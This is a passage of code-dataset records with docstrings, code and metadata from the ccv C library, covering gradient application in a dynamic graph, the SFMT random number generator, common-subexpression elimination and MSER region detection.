(stateful_exec->did_backward_but_not_apply_gradients)\n\t\t\t{\n\t\t\t\tconst ccv_nnc_stateful_cmd_vtab_t* const isa = (ccv_nnc_stateful_cmd_vtab_t*)stateful_exec->cmd.isa;\n\t\t\t\tif (isa->apply_gradients)\n\t\t\t\t\tisa->apply_gradients(stateful_exec->cmd, stream_context);\n\t\t\t\tstateful_exec->did_backward_but_not_apply_gradients = 0;\n\t\t\t\tif (stateful_exec->should_free)\n\t\t\t\t{\n\t\t\t\t\tccfree(stateful_exec);\n\t\t\t\t\t*(ccv_nnc_stateful_exec_t**)ccv_array_get(dynamic_graph->stateful_execs, i) = 0;\n\t\t\t\t\tif (i < dynamic_graph->reuse_stateful_exec || dynamic_graph->reuse_stateful_exec < 0)\n\t\t\t\t\t\tdynamic_graph->reuse_stateful_exec = i;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (parameter_size == 0)\n\t{\n\t\tccv_nnc_stream_context_wait(stream_context);\n\t\treturn;\n\t}\n\tconst int aux_size = ccv_nnc_minimizer_saved_aux_size(minimizer);\n\tconst int saved_aux_size = parameter_size * aux_size;\n\tccv_nnc_tensor_symbol_t update_inputs[aux_size + 2];\n\tccv_nnc_tensor_symbol_t update_outputs[aux_size + 1];\n\tint freeable_size = 0;\n\tccv_nnc_graph_exec_symbol_t sources[parameter_size];\n\tccv_nnc_graph_exec_symbol_t minimizes[parameter_size];\n\tccv_nnc_tensor_variable_t freeables[parameter_size + saved_aux_size];\n\tccv_array_t* const symbol_stack = ccv_array_new(sizeof(ccv_nnc_tape_symbol_t), 1, 0);\n\tccv_nnc_tensor_symbol_new_hook(dynamic_graph->tape, ccv_nnc_dynamic_graph_push_backward_tensor_symbol, symbol_stack);\n\tccv_nnc_tensor_symbol_alias_new_hook(dynamic_graph->tape, ccv_nnc_dynamic_graph_push_backward_tensor_symbol_alias, symbol_stack);\n\tccv_nnc_graph_exec_symbol_new_hook(dynamic_graph->tape, ccv_nnc_dynamic_graph_push_backward_graph_exec_symbol, symbol_stack);\n\tccv_array_t* const tensor_binds = ccv_array_new(sizeof(ccv_nnc_tensor_bind_t), parameter_size * 3 + saved_aux_size * 2, 0);\n\tconst int parallel_count = ccv_max(parallel, 1);\n\tconst int per_parameter_size = parameter_size / parallel_count;\n\tassert((parameter_size % parallel_count) == 0);\n\tccv_nnc_tensor_symbol_t* const allreduce_inputs = parallel_count > 1 ? (ccv_nnc_tensor_symbol_t*)alloca(sizeof(ccv_nnc_tensor_symbol_t) * parallel_count * 2 + sizeof(ccv_nnc_graph_exec_symbol_t) * per_parameter_size) : 0;\n\tccv_nnc_tensor_symbol_t* const allreduce_outputs = allreduce_inputs ? allreduce_inputs + parallel_count : 0;\n\tccv_nnc_graph_exec_symbol_t* const allreduces = allreduce_outputs ? (ccv_nnc_graph_exec_symbol_t*)(allreduce_outputs + parallel_count) : 0;\n\tif (parallel_count > 1) // Doing allreduce first.\n\t{\n\t\tfor (i = 0; i < per_parameter_size; i++)\n\t\t{\n\t\t\tfor (j = 0; j < parallel_count; j++)\n\t\t\t{\n\t\t\t\tconst int idx = i + j * per_parameter_size;\n\t\t\t\tassert(parameters[idx]->symbol.d >= 0);\n\t\t\t\tconst ccv_nnc_tensor_param_t info = parameters[idx]->info;\n\t\t\t\tconst ccv_nnc_tensor_symbol_t gradient = allreduce_inputs[j] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\t\tconst ccv_nnc_tensor_bind_t bind = {\n\t\t\t\t\t.symbol = gradient,\n\t\t\t\t\t.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, gradients[idx], stream_context)\n\t\t\t\t};\n\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t\tallreduce_outputs[j] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\t}\n\t\t\tallreduces[i] = ccv_nnc_graph_exec_symbol_new(dynamic_graph->tape, CMD_COMM_ALLREDUCE_FORWARD(), allreduce_inputs, parallel_count, allreduce_outputs, parallel_count, 0);\n\t\t\tfor (j = 0; j < parallel_count; j++)\n\t\t\t{\n\t\t\t\tconst int idx = i + j * per_parameter_size;\n\t\t\t\tassert(parameters[idx]->symbol.d >= 0);\n\t\t\t\tconst ccv_nnc_tensor_param_t info = parameters[idx]->info;\n\t\t\t\tupdate_inputs[0] = allreduce_outputs[j];\n\t\t\t\tupdate_inputs[1] = parameters[idx]->symbol;\n\t\t\t\tccv_nnc_tensor_bind_t bind = {\n\t\t\t\t\t.symbol = parameters[idx]->symbol,\n\t\t\t\t\t.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, parameters[idx], stream_context)\n\t\t\t\t};\n\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t\tfreeables[freeable_size++] = ccv_nnc_tensor_variable_exchange_new(dynamic_graph, parameters[idx]);\n\t\t\t\tbind.symbol = update_outputs[0] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, parameters[idx], stream_context);\n\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t\tint k;\n\t\t\t\tccv_nnc_tensor_symbol_t set_zeros[aux_size];\n\t\t\t\tint set_zero_size = 0;\n\t\t\t\tfor (k = 0; k < aux_size; k++)\n\t\t\t\t\tupdate_inputs[2 + k] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\t\tfor (k = 0; k < aux_size; k++)\n\t\t\t\t\tif (!ccv_nnc_tensor_variable_contains_value(saved_aux[idx * aux_size + k])) // Need to 0 init the saved aux in this case.\n\t\t\t\t\t{\n\t\t\t\t\t\tif (ccv_nnc_is_tensor_auto(saved_aux[idx * aux_size + k]->info))\n\t\t\t\t\t\t\tsaved_aux[idx * aux_size + k]->info = info;\n\t\t\t\t\t\tset_zeros[set_zero_size++] = update_inputs[2 + k];\n\t\t\t\t\t}\n\t\t\t\tfor (k = 0; k < aux_size; k++)\n\t\t\t\t{\n\t\t\t\t\tbind.symbol = update_inputs[2 + k];\n\t\t\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, saved_aux[idx * aux_size + k], stream_context);\n\t\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t\t\tfreeables[freeable_size++] = ccv_nnc_tensor_variable_exchange_new(dynamic_graph, saved_aux[idx * aux_size + k]);\n\t\t\t\t\tbind.symbol = update_outputs[1 + k] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, saved_aux[idx * aux_size + k], stream_context);\n\t\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t\t}\n\t\t\t\tsources[idx] = minimizes[idx] = ccv_nnc_graph_exec_symbol_new(dynamic_graph->tape, minimizer, update_inputs, aux_size + 2, update_outputs, aux_size + 1, 0);\n\t\t\t\tif (set_zero_size > 0)\n\t\t\t\t{\n\t\t\t\t\tconst ccv_nnc_graph_exec_symbol_t set_zero = ccv_nnc_graph_exec_symbol_new(dynamic_graph->tape, CMD_SET_FORWARD(0), 0, 0, set_zeros, set_zero_size, 0);\n\t\t\t\t\tccv_nnc_graph_exec_symbol_concat(dynamic_graph->tape, set_zero, minimizes[idx]);\n\t\t\t\t\tccv_nnc_graph_exec_symbol_concat(dynamic_graph->tape, allreduces[i], set_zero);\n\t\t\t\t\tsources[idx] = set_zero;\n\t\t\t\t} else\n\t\t\t\t\tccv_nnc_graph_exec_symbol_concat(dynamic_graph->tape, allreduces[i], minimizes[idx]);\n\t\t\t}\n\t\t}\n\t} else {\n\t\tfor (i = 0; i < per_parameter_size; i++)\n\t\t{\n\t\t\tassert(parameters[i]->symbol.d >= 0);\n\t\t\tconst ccv_nnc_tensor_param_t info = parameters[i]->info;\n\t\t\tconst ccv_nnc_tensor_symbol_t gradient = update_inputs[0] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\tccv_nnc_tensor_bind_t bind = {\n\t\t\t\t.symbol = gradient,\n\t\t\t\t.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, gradients[i], stream_context)\n\t\t\t};\n\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\tupdate_inputs[1] = parameters[i]->symbol;\n\t\t\tbind.symbol = parameters[i]->symbol;\n\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, parameters[i], stream_context);\n\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\tfreeables[freeable_size++] = ccv_nnc_tensor_variable_exchange_new(dynamic_graph, parameters[i]);\n\t\t\tbind.symbol = update_outputs[0] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, parameters[i], stream_context);\n\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\tccv_nnc_tensor_symbol_t set_zeros[aux_size];\n\t\t\tint set_zero_size = 0;\n\t\t\tfor (j = 0; j < aux_size; j++)\n\t\t\t\tupdate_inputs[2 + j] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\tfor (j = 0; j < aux_size; j++)\n\t\t\t\tif (!ccv_nnc_tensor_variable_contains_value(saved_aux[i * aux_size + j])) // Need to 0 init the saved aux in this case.\n\t\t\t\t{\n\t\t\t\t\tif (ccv_nnc_is_tensor_auto(saved_aux[i * aux_size + j]->info))\n\t\t\t\t\t\tsaved_aux[i * aux_size + j]->info = info;\n\t\t\t\t\tset_zeros[set_zero_size++] = update_inputs[2 + j];\n\t\t\t\t}\n\t\t\tfor (j = 0; j < aux_size; j++)\n\t\t\t{\n\t\t\t\tbind.symbol = update_inputs[2 + j];\n\t\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, saved_aux[i * aux_size + j], stream_context);\n\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t\tfreeables[freeable_size++] = ccv_nnc_tensor_variable_exchange_new(dynamic_graph, saved_aux[i * aux_size + j]);\n\t\t\t\tbind.symbol = update_outputs[1 + j] = ccv_nnc_tensor_symbol_new(dynamic_graph->tape, info, 0);\n\t\t\t\tbind.tensor = ccv_nnc_tensor_from_variable(dynamic_graph, saved_aux[i * aux_size + j], stream_context);\n\t\t\t\tccv_array_push(tensor_binds, &bind);\n\t\t\t}\n\t\t\tsources[i] = minimizes[i] = ccv_nnc_graph_exec_symbol_new(dynamic_graph->tape, minimizer, update_inputs, aux_size + 2, update_outputs, aux_size + 1, 0);\n\t\t\tif (set_zero_size > 0)\n\t\t\t{\n\t\t\t\tconst ccv_nnc_graph_exec_symbol_t set_zero = ccv_nnc_graph_exec_symbol_new(dynamic_graph->tape, CMD_SET_FORWARD(0), 0, 0, set_zeros, set_zero_size, 0);\n\t\t\t\tccv_nnc_graph_exec_symbol_concat(dynamic_graph->tape, set_zero, minimizes[i]);\n\t\t\t\tsources[i] = set_zero;\n\t\t\t}\n\t\t}\n\t}\n\tccv_nnc_dy_xpu_alloc_t xpu_alloc = {\n\t\t.graph = dynamic_graph,\n\t\t.stream = stream_context\n\t};\n\tccv_nnc_symbolic_graph_compile_param_t compile_params = {\n\t\t.allocator = {\n\t\t\t.isa = &ccv_nnc_dy_allocator_isa,\n\t\t\t.context = {\n\t\t\t\t.alloc = &xpu_alloc,\n\t\t\t\t.free = dynamic_graph,\n\t\t\t}\n\t\t}\n\t};\n\tccv_nnc_graph_t* graph = 0;\n\tccv_nnc_tensor_arena_t* tensor_arena = 0;\n\tccv_nnc_graph_exec_arena_t* exec_arena = 0;\n\tccv_nnc_symbolic_graph_compile(dynamic_graph->tape, compile_params,\n\t\t(ccv_nnc_tensor_bind_t*)ccv_array_get(tensor_binds, 0), tensor_binds->rnum,\n\t\t0, 0,\n\t\tparallel_count > 1 ? allreduces : sources, parallel_count > 1 ? per_parameter_size : parameter_size,\n\t\tminimizes, parameter_size,\n\t\t&graph, &tensor_arena, &exec_arena);\n\tccv_nnc_tensor_symbol_new_hook(dynamic_graph->tape, 0, 0);\n\tccv_nnc_tensor_symbol_alias_new_hook(dynamic_graph->tape, 0, 0);\n\tccv_nnc_graph_exec_symbol_new_hook(dynamic_graph->tape, 0, 0);\n\tccv_array_free(tensor_binds);\n\t// Remove newly added symbols to restore the graph.\n\tfor (i = 0; i < symbol_stack->rnum; i++)\n\t{\n\t\tconst ccv_nnc_tape_symbol_t* const symbol = (ccv_nnc_tape_symbol_t*)ccv_array_get(symbol_stack, i);\n\t\tif (symbol->type == CCV_NNC_SYMBOL_TENSOR || symbol->type == CCV_NNC_SYMBOL_TENSOR_ALIAS)\n\t\t\tccv_nnc_tensor_symbol_free(dynamic_graph->tape, (ccv_nnc_tensor_symbol_t){\n\t\t\t\t.d = symbol->d,\n\t\t\t\t.graph = dynamic_graph->tape\n\t\t\t});\n\t\telse if (symbol->type == CCV_NNC_SYMBOL_GRAPH_EXEC)\n\t\t\tccv_nnc_graph_exec_symbol_free(dynamic_graph->tape, (ccv_nnc_graph_exec_symbol_t){\n\t\t\t\t.d = symbol->d,\n\t\t\t\t.graph = dynamic_graph->tape\n\t\t\t});\n\t}\n\tccv_array_free(symbol_stack);\n\tif (stream_context)\n\t{\n\t\tccv_nnc_graph_set_default_static_schedule(graph, ccv_nnc_stream_context_type(stream_context));\n\t\tccv_nnc_graph_run(graph, 0, TRAVERSE_FULL, 0, stream_context);\n\t\tccv_nnc_stream_context_wait(stream_context);\n\t} else if (parallel_count > 1) { // We need to schedule it, now to figure out what stream type we are at.\n\t\tint flag = 0;\n\t\tfor (i = 0; !flag && i < parameter_size; i++)\n\t\t\tflag = (CCV_TENSOR_GET_MEMORY(parameters[i]->info.type) == CCV_TENSOR_GPU_MEMORY);\n\t\tconst int stream_type = flag ? CCV_STREAM_CONTEXT_GPU : CCV_STREAM_CONTEXT_CPU;\n\t\tccv_nnc_graph_set_default_static_schedule(graph, stream_type);\n\t\tccv_nnc_stream_context_t* const default_stream = ccv_nnc_graph_default_stream(graph);\n\t\tccv_nnc_graph_run(graph, 0, TRAVERSE_FULL, 0, default_stream);\n\t\tccv_nnc_stream_context_wait(default_stream);\n\t} else\n\t\tccv_nnc_graph_run(graph, 0, TRAVERSE_FULL, 0, 0);\n\tccv_nnc_graph_free(graph);\n\tccv_nnc_tensor_arena_free(tensor_arena);\n\tccv_nnc_graph_exec_arena_free(exec_arena);\n\t// Now, able to free some of the reused outputs. This need to be the last step otherwise some of the exec symbols\n\t// above may be freed by this operation.\n\tfor (i = 0; i < freeable_size; i++)\n\t\tccv_nnc_tensor_variable_free(dynamic_graph, freeables[i]);\n}", "path": "ccv/lib/nnc/ccv_nnc_dynamic_graph_apply_gradients.c", "commit_date": "2020-11-17 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function returns the identification string.\n * The string shows the word size, the Mersenne exponent,\n * and all parameters of this generator.\n * @param sfmt SFMT internal state\n */\n", "func_signal": "const char *sfmt_get_idstring(sfmt_t * sfmt)", "code": "{\n    UNUSED_VARIABLE(sfmt);\n    return SFMT_IDSTR;\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function fills the internal state array with pseudorandom\n * integers.\n * @param sfmt SFMT internal state\n */\n", "func_signal": "void sfmt_gen_rand_all(sfmt_t * sfmt)", "code": "{\n    int i;\n    w128_t *r1, *r2;\n\n    r1 = &sfmt->state[SFMT_N - 2];\n    r2 = &sfmt->state[SFMT_N - 1];\n    for (i = 0; i < SFMT_N - SFMT_POS1; i++) {\n\tdo_recursion(&sfmt->state[i], &sfmt->state[i],\n\t\t     &sfmt->state[i + SFMT_POS1], r1, r2);\n\tr1 = r2;\n\tr2 = &sfmt->state[i];\n    }\n    for (; i < SFMT_N; i++) {\n\tdo_recursion(&sfmt->state[i], &sfmt->state[i],\n\t\t     &sfmt->state[i + SFMT_POS1 - SFMT_N], r1, r2);\n\tr1 = r2;\n\tr2 = &sfmt->state[i];\n    }\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/**\n * This function initializes the internal state array with a 32-bit\n * integer seed.\n *\n * @param sfmt SFMT internal state\n * @param seed a 32-bit integer used as the seed.\n */\n", "func_signal": "void sfmt_init_gen_rand(sfmt_t * sfmt, uint32_t seed)", "code": "{\n    int i;\n\n    uint32_t *psfmt32 = &sfmt->state[0].u[0];\n\n    psfmt32[idxof(0)] = seed;\n    for (i = 1; i < SFMT_N32; i++) {\n\tpsfmt32[idxof(i)] = 1812433253UL * (psfmt32[idxof(i - 1)]\n\t\t\t\t\t    ^ (psfmt32[idxof(i - 1)] >> 30))\n\t    + i;\n    }\n    sfmt->idx = SFMT_N32;\n    period_certification(sfmt);\n}", "path": "ccv/lib/3rdparty/sfmt/SFMT.c", "commit_date": "2019-12-23 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "// This is a simple common sub-expression elimination implementation, particularly, we only replace the later computed output\n// with the identical earlier computed output, and let the \"elimination\" part to the graph pruning.\n", "func_signal": "static void _ccv_nnc_symbolic_graph_common_subexpression_elimination(ccv_nnc_symbolic_graph_simplify_t* const simplify, const ccv_nnc_tensor_symbol_t* const outputs, const int output_size)", "code": "{\n\t_ccv_nnc_symbolic_graph_simplify_update_output_execs(simplify);\n\t// tensor_hash starts with 0s, and it is either marked with the tensor index + 1, or the hash of the computations.\n\tuint64_t* const tensor_hash = (uint64_t*)cccalloc(simplify->tensor_symbol_info_size, sizeof(uint64_t));\n\tint i;\n\tccv_nnc_graph_visit_for(simplify->visit, simplify->exec_symbol_info, node, idx) {\n\t\t// We cannot support graph / custom command (we cannot model them properly).\n\t\tif (node->cmd.cmd == CCV_NNC_GRAPH_FORWARD ||\n\t\t\tnode->cmd.cmd == CCV_NNC_GRAPH_BACKWARD ||\n\t\t\tnode->cmd.cmd == CCV_NNC_CUSTOM_FORWARD ||\n\t\t\tnode->cmd.cmd == CCV_NNC_CUSTOM_BACKWARD)\n\t\t\tcontinue;\n\t\t// If already marked as dead, skip.\n\t\tif (simplify->exec_dead[idx >> 5] & (1u << (idx & 0x1f)))\n\t\t\tcontinue;\n\t\tuint64_t hashout, hashin[3];\n\t\tsiphash((uint8_t*)&hashin[0], (const uint8_t*)&node->cmd.info, sizeof(node->cmd.info), key_siphash);\n\t\tsiphash((uint8_t*)&hashin[1], (const uint8_t*)&node->hint, sizeof(node->hint), key_siphash);\n\t\thashin[2] = node->cmd.cmd; // Now actually hash the cmd name.\n\t\tsiphash((uint8_t*)&hashout, (const uint8_t*)hashin, sizeof(hashin), key_siphash);\n\t\t// First, hash the cmd and the hints with the cmd.\n\t\t// Note on alias, we cannot really generate proper hash for alias (yet). Thus, just treat alias as normal tensors.\n\t\tfor (i = 0; i < node->input_size; i++)\n\t\t{\n\t\t\tassert(node->inputs[i] < simplify->tensor_symbol_info_size);\n\t\t\t// If no hash for the input, use the index + 1 as the hash.\n\t\t\tif (node->inputs[i] >= 0 && tensor_hash[node->inputs[i]] == 0)\n\t\t\t\ttensor_hash[node->inputs[i]] = node->inputs[i] + 1;\n\t\t\tif (node->inputs[i] >= 0)\n\t\t\t{\n\t\t\t\t// Hash using the tensor hash.\n\t\t\t\thashin[0] = hashout;\n\t\t\t\thashin[1] = i; // Encode the positional information.\n\t\t\t\thashin[2] = tensor_hash[node->inputs[i]];\n\t\t\t} else {\n\t\t\t\t// Hash using the input integer (could be special integer).\n\t\t\t\thashin[0] = hashout;\n\t\t\t\thashin[1] = i; // Encode the positional information.\n\t\t\t\thashin[2] = node->inputs[i];\n\t\t\t}\n\t\t\tsiphash((uint8_t*)&hashout, (const uint8_t*)hashin, sizeof(hashin), key_siphash);\n\t\t}\n\t\tfor (i = 0; i < node->output_size; i++)\n\t\t\tif (node->outputs[i] >= 0)\n\t\t\t{\n\t\t\t\tassert(node->outputs[i] < simplify->tensor_symbol_info_size);\n\t\t\t\t// Assigning once, especially now we don't consider aliases.\n\t\t\t\tassert(tensor_hash[node->outputs[i]] == 0);\n\t\t\t\thashin[0] = hashout;\n\t\t\t\thashin[1] = i; // Positional information.\n\t\t\t\tsiphash((uint8_t*)&hashin[2], (const uint8_t*)&simplify->tensor_symbol_info[node->outputs[i]].info,\n\t\t\t\t\t\tsizeof(simplify->tensor_symbol_info[node->outputs[i]].info), key_siphash);\n\t\t\t\t// Generate hash for the output.\n\t\t\t\tsiphash((uint8_t*)&tensor_hash[node->outputs[i]], (const uint8_t*)hashin, sizeof(hashin), key_siphash);\n\t\t\t}\n\t} ccv_nnc_graph_visit_endfor\n\t// Allocate 3 / 2 as much space, for the simple robin-hood open address hash map.\n\tconst int map_size = (simplify->tensor_symbol_info_size * 3 + 1) / 2;\n\tint* const refs = (int*)ccmalloc(sizeof(int) * simplify->tensor_symbol_info_size);\n\tfor (i = 0; i < simplify->tensor_symbol_info_size; i++)\n\t\trefs[i] = -1;\n\tccv_nnc_cse_hash_t* const hash_map = (ccv_nnc_cse_hash_t*)cccalloc(map_size, sizeof(ccv_nnc_cse_hash_t));\n\t// Now, all tensors are hashed, identify tensors with the same hash code, replace the ones that accessed later.\n\tccv_nnc_graph_visit_for(simplify->visit, simplify->exec_symbol_info, node, idx) {\n\t\t// If already marked as dead, skip.\n\t\tif (simplify->exec_dead[idx >> 5] & (1u << (idx & 0x1f)))\n\t\t\tcontinue;\n\t\tfor (i = 0; i < node->input_size; i++)\n\t\t\tif (node->inputs[i] >= 0)\n\t\t\t{\n\t\t\t\tconst int d = node->inputs[i];\n\t\t\t\tassert(tensor_hash[d]);\n\t\t\t\tconst int new_d = _ccv_nnc_cse_hash_find(hash_map, tensor_hash[d], map_size);\n\t\t\t\tif (new_d >= 0 && new_d != d)\n\t\t\t\t{\n\t\t\t\t\t// Check whether this can be replaced.\n\t\t\t\t\tassert(refs[d] == -1 || refs[d] == new_d);\n\t\t\t\t\tassert(!simplify->tensor_symbol_info[d].assign_ref);\n\t\t\t\t\tassert(!simplify->tensor_symbol_info[d].r_assign_ref);\n\t\t\t\t\tassert(!simplify->tensor_symbol_info[d].bypass_ref);\n\t\t\t\t\tassert(!simplify->tensor_symbol_info[new_d].assign_ref);\n\t\t\t\t\tassert(!simplify->tensor_symbol_info[new_d].r_assign_ref);\n\t\t\t\t\tassert(!simplify->tensor_symbol_info[new_d].bypass_ref);\n\t\t\t\t\t// Ignore if there is a pair_ref (again, pair_ref has side effect that is deeper (using tape))\n\t\t\t\t\tif (simplify->tensor_symbol_info[d].pair_ref)\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t// If both have p_ref, we cannot merge.\n\t\t\t\t\tif (simplify->tensor_symbol_info[d].p_ref && simplify->tensor_symbol_info[new_d].p_ref)\n\t\t\t\t\t\tcontinue;\n\t\t\t\t\t// Merge s_refs from ref[d] later.\n\t\t\t\t\tif (refs[d] != new_d)\n\t\t\t\t\t\trefs[d] = new_d;\n\t\t\t\t\tassert(simplify->output_execs[new_d] >= 0);\n\t\t\t\t\t// Establish new dependency.\n\t\t\t\t\tccv_nnc_graph_exec_symbol_concat(simplify->graph, (ccv_nnc_graph_exec_symbol_t){\n\t\t\t\t\t\t.d = simplify->output_execs[new_d],\n\t\t\t\t\t\t.graph = simplify->graph,\n\t\t\t\t\t}, (ccv_nnc_graph_exec_symbol_t){\n\t\t\t\t\t\t.d = idx,\n\t\t\t\t\t\t.graph = simplify->graph,\n\t\t\t\t\t});\n\t\t\t\t}\n\t\t\t}\n\t\t// We can reuse the input, but we cannot do that for output of these commands.\n\t\tif (node->cmd.cmd == CCV_NNC_GRAPH_FORWARD ||\n\t\t\tnode->cmd.cmd == CCV_NNC_GRAPH_BACKWARD ||\n\t\t\tnode->cmd.cmd == CCV_NNC_CUSTOM_FORWARD ||\n\t\t\tnode->cmd.cmd == CCV_NNC_CUSTOM_BACKWARD)\n\t\t\tcontinue;\n\t\tfor (i = 0; i < node->output_size; i++)\n\t\t\tif (node->outputs[i] >= 0) // This tensor can be reused by others.\n\t\t\t\t_ccv_nnc_cse_hash_add(hash_map, tensor_hash[node->outputs[i]], node->outputs[i], map_size);\n\t} ccv_nnc_graph_visit_endfor\n\t_ccv_nnc_symbolic_graph_update_refs(simplify, outputs, output_size, refs, 1 /* For these exec that generates refs, we don't need them any more. */);\n\tccfree(tensor_hash);\n\tccfree(hash_map);\n\tccfree(refs);\n}", "path": "ccv/lib/nnc/ccv_nnc_symbolic_graph_simplify.c", "commit_date": "2020-09-19 00:00:00", "repo_name": "liuliu/ccv", "stars": 7027, "license": "other", "language": "c", "size": 389115}
{"docstring": "/* extend ccv_mser_node_t to record more information about the region */\n", "func_signal": "static void _ccv_set_union_mser(ccv_dense_matrix_t* a, ccv_dense_matrix_t* h, ccv_dense_matrix_t* b, ccv_array_t* seq, ccv_mser_param_t params)", "code": "{\n\tassert(params.direction == CCV_BRIGHT_TO_DARK || params.direction == CCV_DARK_TO_BRIGHT);\n\tint v, i, j;\n\tccv_mser_node_t* node = (ccv_mser_node_t*)ccmalloc(sizeof(ccv_mser_node_t) * a->rows * a->cols);\n\tccv_mser_node_t** rnode = (ccv_mser_node_t**)ccmalloc(sizeof(ccv_mser_node_t*) * a->rows * a->cols);\n\tif (params.range <= 0)\n\t\tparams.range = 255;\n\t// put it in a block so that the memory allocated can be released in the end\n\tint* buck = (int*)alloca(sizeof(int) * (params.range + 2));\n\tmemset(buck, 0, sizeof(int) * (params.range + 2));\n\tccv_mser_node_t* pnode = node;\n\t// this for_block is the only computation that can be shared between dark to bright and bright to dark\n\t// two MSER alternatives, and it only occupies 10% of overall time, we won't share this computation\n\t// at all (also, we need to reinitialize node for the two passes anyway).\n\tif (h != 0)\n\t{\n\t\tunsigned char* aptr = a->data.u8;\n\t\tunsigned char* hptr = h->data.u8;\n#define for_block(_for_get_a, _for_get_h) \\\n\t\tfor (i = 0; i < a->rows; i++) \\\n\t\t{ \\\n\t\t\tfor (j = 0; j < a->cols; j++) \\\n\t\t\t\tif (_for_get_h(hptr, j) == 0) \\\n\t\t\t\t\t++buck[_for_get_a(aptr, j)]; \\\n\t\t\taptr += a->step; \\\n\t\t\thptr += h->step; \\\n\t\t} \\\n\t\tfor (i = 1; i <= params.range; i++) \\\n\t\t\tbuck[i] += buck[i - 1]; \\\n\t\tbuck[params.range + 1] = buck[params.range]; \\\n\t\taptr = a->data.u8; \\\n\t\thptr = h->data.u8; \\\n\t\tfor (i = 0; i < a->rows; i++) \\\n\t\t{ \\\n\t\t\tfor (j = 0; j < a->cols; j++) \\\n\t\t\t{ \\\n\t\t\t\t_ccv_mser_init_node(pnode, j, i); \\\n\t\t\t\tif (_for_get_h(hptr, j) == 0) \\\n\t\t\t\t\trnode[--buck[_for_get_a(aptr, j)]] = pnode; \\\n\t\t\t\telse \\\n\t\t\t\t\tpnode->shortcut = 0; /* this means the pnode is not available */ \\\n\t\t\t\t++pnode; \\\n\t\t\t} \\\n\t\t\taptr += a->step; \\\n\t\t\thptr += h->step; \\\n\t\t}\n\t\tccv_matrix_getter_integer_only_a(a->type, ccv_matrix_getter_integer_only, h->type, for_block);\n#undef for_block\n\t} else {\n\t\tunsigned char* aptr = a->data.u8;\n#define for_block(_, _for_get) \\\n\t\tfor (i = 0; i < a->rows; i++) \\\n\t\t{ \\\n\t\t\tfor (j = 0; j < a->cols; j++) \\\n\t\t\t\t++buck[_for_get(aptr, j)]; \\\n\t\t\taptr += a->step; \\\n\t\t} \\\n\t\tfor (i = 1; i <= params.range; i++) \\\n\t\t\tbuck[i] += buck[i - 1]; \\\n\t\tbuck[params.range + 1] = buck[params.range]; \\\n\t\taptr = a->data.u8; \\\n\t\tfor (i = 0; i < a->rows; i++) \\\n\t\t{ \\\n\t\t\tfor (j = 0; j < a->cols; j++) \\\n\t\t\t{ \\\n\t\t\t\t_ccv_mser_init_node(pnode, j, i); \\\n\t\t\t\trnode[--buck[_for_get(aptr, j)]] = pnode; \\\n\t\t\t\t++pnode; \\\n\t\t\t} \\\n\t\t\taptr += a->step; \\\n\t\t}\n\t\tccv_matrix_getter_integer_only(a->type, for_block);\n#undef for_block\n\t}\n\tccv_array_t* history_list = ccv_array_new(sizeof(ccv_mser_history_t), 64, 0);\n\tfor (v = 0; v <= params.range; v++)\n\t{\n\t\tint range_segment = buck[params.direction == CCV_DARK_TO_BRIGHT ? v : params.range - v];\n\t\tint range_segment_cap = buck[params.direction == CCV_DARK_TO_BRIGHT ? v + 1 : params.range - v + 1];\n\t\tfor (i = range_segment; i < range_segment_cap; i++)\n\t\t{\n\t\t\tccv_mser_node_t* pnode = rnode[i];\n\t\t\t// try to merge pnode with its neighbors\n\t\t\tstatic int dx[] = {-1, 0, 1, -1, 1, -1, 0, 1};\n\t\t\tstatic int dy[] = {-1, -1, -1, 0, 0, 1, 1, 1};\n\t\t\tccv_mser_node_t* node0 = _ccv_mser_find_root(pnode);\n\t\t\tfor (j = 0; j < 8; j++)\n\t\t\t{\n\t\t\t\tint x = dx[j] + pnode->point.x;\n\t\t\t\tint y = dy[j] + pnode->point.y;\n\t\t\t\tif (x >= 0 && x < a->cols && y >= 0 && y < a->rows)\n\t\t\t\t{\n\t\t\t\t\tccv_mser_node_t* nnode = pnode + dx[j] + dy[j] * a->cols;\n\t\t\t\t\tif (nnode->shortcut == 0) // this is a void node, 